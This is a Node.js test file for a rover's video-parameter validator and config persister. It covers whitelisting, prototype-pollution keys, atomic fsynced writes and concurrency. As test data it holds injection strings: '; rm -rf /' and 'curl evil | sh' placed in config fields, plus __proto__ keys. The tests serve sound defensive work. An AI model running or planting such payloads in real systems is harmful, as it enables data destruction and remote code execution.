'use strict';

// Tests for operator video-parameter validation and persistence.
//
// The persistence half exists because video settings silently reverted on every
// restart. The validation half exists because persisting made the pre-existing lack of
// validation far more dangerous: `setParams()` previously assigned whatever arrived, so
// an unauthenticated socket could put a string or a NaN into the generated YAML — and
// once that is written to the per-rover overlay, it survives reboots as an encoder that
// will not start.
//
// The overlay file also holds `rover_id`, the vehicle's identity. Several tests below
// exist purely to prove a video setting can never damage it.

const test   = require('node:test');
const assert = require('node:assert/strict');

const {
  sanitizeVideoParams, overlayUpdatesFor, mergeOverlay, persistVideoParams,
  VIDEO_PARAM_SPEC,
} = require('../video-params');

// ── Validation ───────────────────────────────────────────────────────────────

test('valid parameters are accepted and coerced to integers', () => {
  const { params, rejected } = sanitizeVideoParams(
    { width: '320', height: 240, fps: 12.4, bitrate: 200 });
  assert.deepEqual(params, { width: 320, height: 240, fps: 12, bitrate: 200 });
  assert.deepEqual(rejected, []);
});

test('a value that would break the encoder is rejected, not clamped', () => {
  // Clamping would silently give the operator a setting they did not ask for, and
  // then PERSIST it. Rejecting reports the disagreement instead.
  const { params, rejected } = sanitizeVideoParams(
    { width: 0, height: -1, fps: 0, bitrate: 99999 });
  assert.deepEqual(params, {}, 'nothing invalid may be applied');
  assert.equal(rejected.length, 4);
  for (const field of ['width', 'height', 'fps', 'bitrate']) {
    assert.ok(rejected.some((m) => m.startsWith(field)), `${field} must be reported`);
  }
});

test('non-numeric and structural garbage is rejected', () => {
  // These are exactly what an unauthenticated caller sends. Each used to be assigned
  // straight into the YAML.
  for (const bad of ['fast', null, {}, [], true, NaN, Infinity, undefined]) {
    const { params } = sanitizeVideoParams({ fps: bad });
    assert.deepEqual(params, {}, `fps=${JSON.stringify(bad) ?? 'undefined'} must be refused`);
  }
});

test('unknown keys are refused, so only whitelisted settings can ever be written', () => {
  // Built with JSON.parse, NOT an object literal. In a literal, `__proto__:` invokes the
  // prototype SETTER and creates no own property, so the earlier version of this test
  // never presented the key at all — it asserted a case it structurally could not reach.
  // JSON.parse creates a real own property, which is what arrives over the wire.
  const { params, rejected } = sanitizeVideoParams(JSON.parse(
    '{"width":640,"rpiCameraExtraArgs":"; rm -rf /","__proto__":"x","runOnInit":"curl evil"}'));
  assert.deepEqual(params, { width: 640 });
  assert.ok(rejected.some((m) => m.includes('rpiCameraExtraArgs')));
  assert.ok(rejected.some((m) => m.includes('runOnInit')),
    'an unrecognised key must be reported, not ignored — this is the YAML injection surface');
  assert.ok(rejected.some((m) => m.includes('__proto__')),
    '__proto__ must be REPORTED, not silently swallowed');
});

test('inherited property names cannot pose as settable parameters', () => {
  // `name in SPEC` walks the prototype chain, so with a plain-object spec table every
  // one of these answered true — and their "spec" is a function whose .min/.max are
  // undefined, so every bounds comparison was false and ANY finite value passed
  // unbounded, straight into the persisted overlay with rejected:[].
  //
  // Two independent defences now block this (a null-prototype spec table, and
  // hasOwnProperty at both lookup sites), which is why removing either one alone does
  // not fail a test. So this pins the BEHAVIOUR rather than either mechanism: it is
  // verified by mutating both together.
  const hostile = JSON.parse(
    '{"width":640,"constructor":7,"toString":9,"valueOf":11,"hasOwnProperty":13,"__proto__":15}');
  const { params, rejected } = sanitizeVideoParams(hostile);
  assert.deepEqual(params, { width: 640 },
    'only the genuine parameter may survive');
  for (const key of ['constructor', 'toString', 'valueOf', 'hasOwnProperty', '__proto__']) {
    assert.ok(rejected.some((m) => m.startsWith(key)),
      `${key} must be reported as not settable (got: ${JSON.stringify(rejected)})`);
  }
  // And the mapping layer independently, since persistVideoParams is exported and its
  // mapping is the last line of defence if a caller forgets to sanitize.
  const { updates } = overlayUpdatesFor('webrtc', hostile);
  assert.deepEqual(updates, { webrtc_width: 640 },
    'the codec mapping must not resolve an inherited name to an overlay key');
});

test('a non-object request is refused outright', () => {
  for (const bad of [null, undefined, 'width=640', 42, []]) {
    const { params, rejected } = sanitizeVideoParams(bad);
    assert.deepEqual(params, {});
    assert.equal(rejected.length, 1, `${JSON.stringify(bad) ?? 'undefined'} must be reported once`);
  }
});

test('the bounds are the specific numbers we intend, not whatever the table says', () => {
  // The generic test below derives its expectations from VIDEO_PARAM_SPEC, so it holds
  // for ANY bounds — a review widened width's max from 1920 to 100000 and all 256 tests
  // stayed green. The bounds are the stated defence against persisting an unstartable
  // encoder, so at least one test has to name the numbers.
  assert.deepEqual(VIDEO_PARAM_SPEC.width,      { min: 160, max: 1920 });
  assert.deepEqual(VIDEO_PARAM_SPEC.height,     { min: 120, max: 1080 });
  assert.deepEqual(VIDEO_PARAM_SPEC.fps,        { min: 1,   max: 60   });
  assert.deepEqual(VIDEO_PARAM_SPEC.bitrate,    { min: 50,  max: 8000 });
  assert.deepEqual(VIDEO_PARAM_SPEC.idr_period, { min: 1,   max: 300  });
  assert.deepEqual(Object.keys(VIDEO_PARAM_SPEC).sort(),
    ['bitrate', 'fps', 'height', 'idr_period', 'quality', 'width'],
    'a new settable parameter must be a deliberate change, not an accident');
});

test('every spec bound is inclusive at both ends', () => {
  // Off-by-one at a boundary would reject a legitimate setting, which reads to the
  // operator as "the UI does not work" — the complaint this whole change answers.
  for (const [name, spec] of Object.entries(VIDEO_PARAM_SPEC)) {
    for (const edge of [spec.min, spec.max]) {
      const { params } = sanitizeVideoParams({ [name]: edge });
      assert.equal(params[name], edge, `${name}=${edge} is in range and must be accepted`);
    }
    for (const outside of [spec.min - 1, spec.max + 1]) {
      const { params } = sanitizeVideoParams({ [name]: outside });
      assert.equal(params[name], undefined, `${name}=${outside} is out of range`);
    }
  }
});

// ── Codec mapping ────────────────────────────────────────────────────────────

test('params map to the tracked config keys the driver actually reads', () => {
  const { updates, unsupported } = overlayUpdatesFor('webrtc',
    { width: 320, height: 240, fps: 12, bitrate: 200 });
  assert.equal(unsupported, false);
  assert.deepEqual(updates, {
    webrtc_width: 320, webrtc_height: 240, webrtc_fps: 12, webrtc_bitrate_kbps: 200,
  });
  // Note the name: bitrate -> webrtc_bitrate_kbps, not webrtc_bitrate. Writing a key
  // the driver never reads would persist silently and change nothing.
  assert.ok('webrtc_bitrate_kbps' in updates);
});

test('h264 maps to its own keys, including the differently-named framerate', () => {
  const { updates } = overlayUpdatesFor('h264', { width: 640, fps: 30, bitrate: 600 });
  assert.deepEqual(updates,
    { h264_width: 640, h264_framerate: 30, h264_bitrate_kbps: 600 });
});

test('an unknown codec reports unsupported rather than persisting nothing quietly', () => {
  const { updates, unsupported } = overlayUpdatesFor('av1', { width: 640 });
  assert.equal(unsupported, true);
  assert.deepEqual(updates, {});
});

// ── Merging must never damage rover identity ─────────────────────────────────

test('merging preserves every key it does not own, including rover_id', () => {
  const existing = { rover_id: 3, battery_empty_volts: 6.0, _comment: 'keep me' };
  const merged = mergeOverlay(existing, { webrtc_width: 320 });
  assert.equal(merged.rover_id, 3,
    'clobbering rover_id would make the vehicle report as a different rover');
  assert.equal(merged.battery_empty_volts, 6.0);
  assert.equal(merged._comment, 'keep me');
  assert.equal(merged.webrtc_width, 320);
});

test('merging does not mutate the object it was given', () => {
  const existing = { rover_id: 3 };
  mergeOverlay(existing, { webrtc_width: 320 });
  assert.deepEqual(existing, { rover_id: 3 }, 'the caller\'s config object must be untouched');
});

// ── Persistence ──────────────────────────────────────────────────────────────

// A fake fs that records writes and can be told to fail, so every branch below is
// exercised against the real persistVideoParams rather than a reimplementation.
function fakeFs({ readResult = null, readError = null, failWrite = false, failRename = false } = {}) {
  const calls = { writes: [], renames: [], unlinks: [], opens: [], syncs: 0, order: [] };
  return {
    calls,
    promises: {
      async readFile() { if (readError) throw readError; return readResult; },
      // Mirrors the real API the module now uses: open with 'wx' (O_CREAT|O_EXCL) and
      // write through the handle, so the test exercises the exclusive-create and fsync
      // path rather than a writeFile the module no longer calls.
      async open(p, flags) {
        calls.opens.push([p, flags]);
        return {
          async writeFile(data) {
            if (failWrite) throw new Error('ENOSPC');
            calls.writes.push([p, data]);
            calls.order.push(`write:${p}`);
          },
          async sync() { calls.syncs += 1; calls.order.push(`sync:${p}`); },
          async close() {},
        };
      },
      async rename(from, to) {
        if (failRename) throw new Error('EXDEV');
        calls.renames.push([from, to]);
        calls.order.push('rename');
      },
      async unlink(p) { calls.unlinks.push(p); },
    },
  };
}

test('a successful persist writes a temp file and renames it into place', async () => {
  // Atomic on purpose: this file holds rover_id and is parsed at startup, so a torn
  // write would leave the rover unable to load its own identity — over a video setting.
  const fs = fakeFs({ readResult: JSON.stringify({ rover_id: 3 }) });
  const r = await persistVideoParams({
    overlayPath: '/opt/picar/picar-cfg.local.json', codec: 'webrtc',
    params: { width: 320, bitrate: 200 }, fs,
  });
  assert.equal(r.persisted, true, r.reason);
  assert.equal(fs.calls.writes.length, 1);
  assert.equal(fs.calls.renames.length, 1);
  const [tmpPath, data] = fs.calls.writes[0];
  assert.notEqual(tmpPath, '/opt/picar/picar-cfg.local.json',
    'the real file must never be written directly');
  assert.equal(fs.calls.renames[0][1], '/opt/picar/picar-cfg.local.json');
  const written = JSON.parse(data);
  assert.equal(written.rover_id, 3, 'rover_id survived');
  assert.equal(written.webrtc_width, 320);
  assert.equal(written.webrtc_bitrate_kbps, 200);
});

test('a missing overlay is created; a CORRUPT one is never overwritten', async () => {
  const enoent = Object.assign(new Error('no such file'), { code: 'ENOENT' });
  const fresh = fakeFs({ readError: enoent });
  const ok = await persistVideoParams({
    overlayPath: '/tmp/x.json', codec: 'webrtc', params: { width: 320 }, fs: fresh });
  assert.equal(ok.persisted, true, 'a fresh rover has no overlay yet; that is normal');

  // Unparseable content means we cannot know what rover_id was. Overwriting would
  // destroy it, so refuse and say why.
  const corrupt = fakeFs({ readResult: '{ this is not json' });
  const bad = await persistVideoParams({
    overlayPath: '/tmp/x.json', codec: 'webrtc', params: { width: 320 }, fs: corrupt });
  assert.equal(bad.persisted, false);
  assert.match(bad.reason, /unreadable overlay/);
  assert.equal(corrupt.calls.writes.length, 0, 'nothing may be written over a corrupt overlay');

  // A JSON array parses fine but is not a config object.
  const arr = fakeFs({ readResult: '[1,2,3]' });
  const arrRes = await persistVideoParams({
    overlayPath: '/tmp/x.json', codec: 'webrtc', params: { width: 320 }, fs: arr });
  assert.equal(arrRes.persisted, false);
  assert.equal(arr.calls.writes.length, 0);
});

test('an unreadable overlay for any reason other than ENOENT is refused', async () => {
  const eacces = Object.assign(new Error('permission denied'), { code: 'EACCES' });
  const fs = fakeFs({ readError: eacces });
  const r = await persistVideoParams({
    overlayPath: '/tmp/x.json', codec: 'webrtc', params: { width: 320 }, fs });
  assert.equal(r.persisted, false, 'EACCES must not be treated like a missing file');
  assert.equal(fs.calls.writes.length, 0);
});

test('a failed write or rename reports failure and cleans up the temp file', async () => {
  const w = fakeFs({ readResult: '{}', failWrite: true });
  const wr = await persistVideoParams({
    overlayPath: '/tmp/x.json', codec: 'webrtc', params: { width: 320 }, fs: w });
  assert.equal(wr.persisted, false);
  assert.match(wr.reason, /write failed/);
  assert.equal(w.calls.unlinks.length, 1, 'a partial temp file must not be left behind');

  const r = fakeFs({ readResult: '{}', failRename: true });
  const rr = await persistVideoParams({
    overlayPath: '/tmp/x.json', codec: 'webrtc', params: { width: 320 }, fs: r });
  assert.equal(rr.persisted, false);
  assert.equal(r.calls.unlinks.length, 1);
});

test('nothing persistable means an explicit no, not a false success', async () => {
  const fs = fakeFs({ readResult: '{}' });
  // mjpeg has no width/height keys in the tracked config.
  const r = await persistVideoParams({
    overlayPath: '/tmp/x.json', codec: 'mjpeg', params: { width: 320 }, fs });
  assert.equal(r.persisted, false);
  assert.equal(fs.calls.writes.length, 0);

  const none = await persistVideoParams({
    overlayPath: '/tmp/x.json', codec: 'webrtc', params: {}, fs });
  assert.equal(none.persisted, false);
  assert.match(none.reason, /nothing to persist/);
});

test('only whitelisted keys can reach the overlay, even via persistVideoParams', async () => {
  // Defence in depth: sanitize runs in the driver, but persistence must not depend on
  // its caller having done so. An injected key must not be writable through this path.
  const fs = fakeFs({ readResult: JSON.stringify({ rover_id: 3 }) });
  const r = await persistVideoParams({
    overlayPath: '/tmp/x.json', codec: 'webrtc',
    params: { width: 320, runOnInit: 'curl evil | sh', pwm_method: 'libgpiod' }, fs });
  assert.equal(r.persisted, true);
  const written = JSON.parse(fs.calls.writes[0][1]);
  assert.deepEqual(Object.keys(written).sort(), ['rover_id', 'webrtc_width'],
    'no key outside the codec mapping may be persisted');
});

// ── The DRIVER must validate, not merely be able to ──────────────────────────

test('setParams refuses garbage at the driver, not just in the helper', () => {
  // Surviving mutation before this test existed:
  //     const clean = newParams; const rejected = [];
  // i.e. the sanitizer imported, called nowhere. Every test above still passed,
  // because they all exercise video-params.js directly. This is the branch's
  // recurring defect shape — a correct rule with an untouched consumer — and it is
  // the one that matters most here, since the consumer is the unauthenticated
  // setVideoParams path that writes the YAML.
  const os   = require('os');
  const fs   = require('fs');
  const path = require('path');
  const makeWebrtc = require('../streams/webrtc.js');

  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'picar-vp-'));
  const yml = path.join(tmpDir, 'mediamtx.yml');
  const stream = makeWebrtc({
    mediamtx_yml: yml,
    webrtc_width: 480, webrtc_height: 360, webrtc_fps: 20, webrtc_bitrate_kbps: 350,
  }, {
    // Injected, NOT config — see RESTART_CMD in streams/webrtc.js for why that
    // distinction is load-bearing. `true` exits 0 immediately, exercising the real
    // restart path without touching a service on the machine running the tests. When
    // this was still a config key the tests spawned `systemctl restart mediamtx` for
    // real, which on a rover restarts the video stream from `npm test`.
    restartCmd: ['true'],
  });
  try {
    const before = { ...stream.getStreamConfig() };

    const bad = stream.setParams({ fps: 'fast', width: 0, runOnInit: 'curl evil | sh' });
    assert.deepEqual(bad.applied, {}, 'no invalid value may be applied');
    assert.ok(bad.rejected.length >= 3, `all three must be reported: ${JSON.stringify(bad.rejected)}`);
    assert.deepEqual(stream.getStreamConfig(), before,
      'the effective config must be unchanged after a fully-invalid request');
    const ymlText = fs.readFileSync(yml, 'utf8');
    assert.ok(!ymlText.includes('curl evil'),
      'an unwhitelisted key reached the generated YAML — this is the injection surface');
    assert.ok(!/rpiCameraFPS: fast/.test(ymlText), ymlText.slice(0, 200));

    // And a valid request must still work, or "it validates" would be satisfied by
    // a setter that refuses everything.
    const ok = stream.setParams({ width: 320, height: 240, fps: 12, bitrate: 200 });
    assert.deepEqual(ok.applied, { width: 320, height: 240, fps: 12, bitrate: 200 });
    const cfg = stream.getStreamConfig();
    assert.equal(cfg.width, 320);
    assert.equal(cfg.bitrate, 200);
    assert.match(fs.readFileSync(yml, 'utf8'), /rpiCameraBitrate: 200000/);
  } finally {
    if (typeof stream.stop === 'function') stream.stop();
    // tmpfs is RAM on this fleet, and the on-target run left these behind.
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test('a partially valid request applies the good values and reports the bad', () => {
  const os   = require('os');
  const fs   = require('fs');
  const path = require('path');
  const makeWebrtc = require('../streams/webrtc.js');
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'picar-vp-'));
  const yml = path.join(tmpDir, 'mediamtx.yml');
  const stream = makeWebrtc({ mediamtx_yml: yml }, { restartCmd: ['true'] });
  try {
    const r = stream.setParams({ width: 320, fps: 999 });
    assert.equal(r.applied.width, 320, 'the valid half must still take effect');
    assert.equal(r.applied.fps, undefined);
    assert.ok(r.rejected.some((m) => m.startsWith('fps')));
    assert.equal(stream.getStreamConfig().fps, 20, 'fps must hold its previous value');
  } finally {
    if (typeof stream.stop === 'function') stream.stop();
    // tmpfs is RAM on this fleet, and the on-target run left these behind.
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

// ── Concurrency: the defect that bricked a rover ─────────────────────────────

test('concurrent persists cannot corrupt the overlay or lose a write', async () => {
  // This runs against a REAL filesystem on purpose. The fake fs above cannot express
  // this failure at all: its writeFile is an array append, which can neither tear nor
  // collide. A review found the original implementation bricked a rover with two
  // unauthenticated socket messages, reproduced 5/5:
  //
  //   the temp path was `.<file>.tmp-${process.pid}` — constant for the process — and
  //   nothing serialised the handlers, so two writes interleaved and one renamed the
  //   torn result into place:
  //       { "rover_id": 3, "webrtc_fps": 15 }0,  "webrtc_height": 720 }
  //
  //   app.js parses this file at startup inside a try whose catch is process.exit(1),
  //   and the unit is Restart=always — so the outcome was a PERMANENT crash loop of the
  //   whole control plane with rover_id destroyed, surviving reboot.
  const fs   = require('fs');
  const os   = require('os');
  const path = require('path');

  for (let round = 0; round < 5; round++) {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'picar-ovl-'));
    const overlayPath = path.join(dir, 'picar-cfg.local.json');
    fs.writeFileSync(overlayPath,
      JSON.stringify({ rover_id: 3, battery_empty_volts: 6.0 }, null, 2));

    const results = await Promise.all([
      persistVideoParams({ overlayPath, codec: 'webrtc',
        params: { width: 1280, height: 720, bitrate: 2000 } }),
      persistVideoParams({ overlayPath, codec: 'webrtc', params: { fps: 15 } }),
      persistVideoParams({ overlayPath, codec: 'webrtc', params: { bitrate: 400 } }),
    ]);

    // 1. It must still parse. This is the brick condition.
    let parsed;
    const text = fs.readFileSync(overlayPath, 'utf8');
    try { parsed = JSON.parse(text); }
    catch (err) { assert.fail(`round ${round}: overlay is CORRUPT (${err.message}): ${text}`); }

    // 2. rover_id must survive — it is the vehicle's identity.
    assert.equal(parsed.rover_id, 3, `round ${round}: rover_id destroyed`);
    assert.equal(parsed.battery_empty_volts, 6.0, `round ${round}: unrelated key lost`);

    // 3. Every write must report honestly AND actually be present. Checking only for
    //    corruption would pass when nothing was written at all, which made an earlier
    //    version of this check useless as a detector.
    for (const r of results) {
      assert.equal(r.persisted, true, `round ${round}: ${r.reason}`);
    }
    assert.equal(parsed.webrtc_width, 1280, `round ${round}: a concurrent write was lost`);
    assert.equal(parsed.webrtc_height, 720, `round ${round}: a concurrent write was lost`);
    assert.equal(parsed.webrtc_fps, 15, `round ${round}: a concurrent write was lost`);

    // 4. No temp files may be left behind.
    const leftover = fs.readdirSync(dir).filter((f) => f.includes('.tmp-'));
    assert.deepEqual(leftover, [], `round ${round}: leftover temp files`);

    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('the temp file is created exclusively, so a planted symlink cannot redirect it', async () => {
  // The old temp name was fully predictable (`.<file>.tmp-<pid>`), so a local user with
  // write access to the directory could pre-create it as a symlink and capture the
  // write. 'wx' is O_CREAT|O_EXCL: an existing path fails instead of being followed.
  const fs = fakeFs({ readResult: '{}' });
  await persistVideoParams({
    overlayPath: '/tmp/x.json', codec: 'webrtc', params: { width: 320 }, fs });
  const tmpOpen = fs.calls.opens.find(([, flags]) => flags === 'wx');
  assert.ok(tmpOpen, `no exclusive-create open was performed: ${JSON.stringify(fs.calls.opens)}`);
  assert.ok(tmpOpen[0].includes('.tmp-'), tmpOpen[0]);
  assert.notEqual(tmpOpen[0], '/tmp/x.json', 'the real file must never be opened for writing');
});

test('the write is fsynced before the rename, so a power cut cannot truncate it', async () => {
  // Without fsync, ext4 data=ordered can commit the rename with the data blocks
  // unwritten, leaving a ZERO-LENGTH config — JSON.parse('') throws, app.js exits, and
  // the unit restarts forever. A rover losing supply is routine, not exotic.
  const fs = fakeFs({ readResult: '{}' });
  await persistVideoParams({
    overlayPath: '/tmp/x.json', codec: 'webrtc', params: { width: 320 }, fs });
  // Assert the ORDER and the TARGET, not merely that some sync happened: the directory
  // fsync after the rename also increments a naive counter, so `syncs >= 1` passed even
  // with the file's own fsync deleted.
  const order = fs.calls.order;
  const renameAt = order.indexOf('rename');
  assert.notEqual(renameAt, -1, 'no rename occurred');
  const tmpSyncAt = order.findIndex((e) => e.startsWith('sync:') && e.includes('.tmp-'));
  assert.notEqual(tmpSyncAt, -1, 'the temp file was never fsynced');
  assert.ok(tmpSyncAt < renameAt,
    `the temp file must be fsynced BEFORE the rename (order: ${JSON.stringify(order)})`);
});
